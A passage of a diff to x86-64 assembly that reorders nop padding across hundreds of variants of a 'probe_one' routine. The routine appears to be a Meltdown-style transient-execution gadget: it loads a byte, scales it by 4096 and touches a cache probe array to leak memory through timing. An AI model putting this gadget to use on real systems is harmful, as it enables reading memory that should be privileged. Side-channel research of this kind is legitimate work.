 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 345
 .Lprobe_one_win0_var345:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 346
 .Lprobe_one_win0_var346:
@@ -6300,29 +6300,29 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 347
 .Lprobe_one_win0_var347:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 348
 .Lprobe_one_win0_var348:
@@ -6336,17 +6336,17 @@ probe_one:
 	nop
 	jz	92b
 	nop
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 349
 .Lprobe_one_win0_var349:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
 	nop
 	jz	92b
 	nop
@@ -6359,15 +6359,15 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
 	nop
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	nop
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 351
 .Lprobe_one_win0_var351:
@@ -6377,85 +6377,85 @@ probe_one:
 	nop
 	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 352
 .Lprobe_one_win0_var352:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 353
 .Lprobe_one_win0_var353:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 354
 .Lprobe_one_win0_var354:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
-	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 355
 .Lprobe_one_win0_var355:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 356
 .Lprobe_one_win0_var356:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -6463,43 +6463,43 @@ probe_one:
 .Lprobe_one_win0_var357:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 358
 .Lprobe_one_win0_var358:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 359
 .Lprobe_one_win0_var359:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
@@ -6508,28 +6508,28 @@ probe_one:
 .Lprobe_one_win0_var360:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
-	shlq	$0xc, %rax
 	nop
+	shlq	$0xc, %rax
 	jz	92b
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 361
 .Lprobe_one_win0_var361:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
 	jz	92b
+	nop
+	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -6538,16 +6538,16 @@ probe_one:
 .Lprobe_one_win0_var362:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 363
 .Lprobe_one_win0_var363:
@@ -6555,11 +6555,11 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	nop
 	nop
@@ -6585,14 +6585,14 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	nop
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 366
 .Lprobe_one_win0_var366:
@@ -6600,29 +6600,29 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	nop
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 367
 .Lprobe_one_win0_var367:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
 	nop
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 368
 .Lprobe_one_win0_var368:
@@ -6632,9 +6632,9 @@ probe_one:
 	nop
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	nop
@@ -6643,14 +6643,14 @@ probe_one:
 .Lprobe_one_win0_var369:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -6659,14 +6659,14 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
 	nop
 	nop
+	nop
+	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 371
@@ -6676,9 +6676,9 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
@@ -6689,59 +6689,59 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 373
 .Lprobe_one_win0_var373:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 374
 .Lprobe_one_win0_var374:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 375
 .Lprobe_one_win0_var375:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 376
@@ -6751,10 +6751,10 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -6763,15 +6763,15 @@ probe_one:
 .Lprobe_one_win0_var377:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 378
@@ -6779,44 +6779,44 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 379
 .Lprobe_one_win0_var379:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 380
 .Lprobe_one_win0_var380:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	jz	92b
 	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 381
@@ -6824,9 +6824,9 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	nop
 	nop
 	shlq	$0xc, %rax
@@ -6846,53 +6846,53 @@ probe_one:
 	nop
 	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 383
 .Lprobe_one_win0_var383:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 384
 .Lprobe_one_win0_var384:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 385
 .Lprobe_one_win0_var385:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
 	nop
-	jz	92b
 	nop
+	nop
+	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 386
 .Lprobe_one_win0_var386:
@@ -6900,11 +6900,11 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	nop
 	nop
@@ -6915,11 +6915,11 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -6928,29 +6928,29 @@ probe_one:
 .Lprobe_one_win0_var388:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
+	nop
+	nop
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 389
 .Lprobe_one_win0_var389:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
-	shlq	$0xc, %rax
 	nop
+	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -6958,30 +6958,30 @@ probe_one:
 .Lprobe_one_win0_var390:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 391
 .Lprobe_one_win0_var391:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 392
@@ -6992,25 +6992,25 @@ probe_one:
 	nop
 	nop
 	nop
-	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 393
 .Lprobe_one_win0_var393:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -7019,41 +7019,41 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	movb	(%rdx), %al
 	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
 	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 395
 .Lprobe_one_win0_var395:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 396
 .Lprobe_one_win0_var396:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
-	nop
-	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
@@ -7066,58 +7066,58 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 398
 .Lprobe_one_win0_var398:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 399
 .Lprobe_one_win0_var399:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 400
 .Lprobe_one_win0_var400:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 401
 .Lprobe_one_win0_var401:
@@ -7127,27 +7127,27 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
-	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 402
 .Lprobe_one_win0_var402:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 403
 .Lprobe_one_win0_var403:
@@ -7157,12 +7157,12 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 404
 .Lprobe_one_win0_var404:
@@ -7171,56 +7171,56 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 405
 .Lprobe_one_win0_var405:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 406
 .Lprobe_one_win0_var406:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	shlq	$0xc, %rax
 	nop
 	nop
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 407
 .Lprobe_one_win0_var407:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
+	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -7228,16 +7228,16 @@ probe_one:
 .Lprobe_one_win0_var408:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 409
 .Lprobe_one_win0_var409:
@@ -7246,28 +7246,28 @@ probe_one:
 	nop
 	nop
 	nop
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 410
 .Lprobe_one_win0_var410:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 411
 .Lprobe_one_win0_var411:
@@ -7277,10 +7277,10 @@ probe_one:
 	nop
 	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -7288,40 +7288,40 @@ probe_one:
 .Lprobe_one_win0_var412:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	nop
 	nop
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 413
 .Lprobe_one_win0_var413:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 414
 .Lprobe_one_win0_var414:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
 	nop
 	nop
 	nop
@@ -7333,29 +7333,29 @@ probe_one:
 .Lprobe_one_win0_var415:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 416
 .Lprobe_one_win0_var416:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -7367,42 +7367,42 @@ probe_one:
 	nop
 	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 418
 .Lprobe_one_win0_var418:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 419
 .Lprobe_one_win0_var419:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 420
 .Lprobe_one_win0_var420:
@@ -7410,29 +7410,29 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
+	nop
 	nop
 	jz	92b
 	nop
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 421
 .Lprobe_one_win0_var421:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 422
 .Lprobe_one_win0_var422:
@@ -7441,73 +7441,73 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
-	jz	92b
 	nop
+	nop
+	nop
+	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 423
 .Lprobe_one_win0_var423:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 424
 .Lprobe_one_win0_var424:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 425
 .Lprobe_one_win0_var425:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 426
 .Lprobe_one_win0_var426:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
+	nop
 	jz	92b
 	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 427
 .Lprobe_one_win0_var427:
@@ -7515,13 +7515,13 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 428
@@ -7529,14 +7529,14 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	nop
 	nop
 	shlq	$0xc, %rax
 	nop
+	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 429
@@ -7545,12 +7545,12 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
-	nop
-	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -7560,13 +7560,13 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 431
@@ -7574,103 +7574,103 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
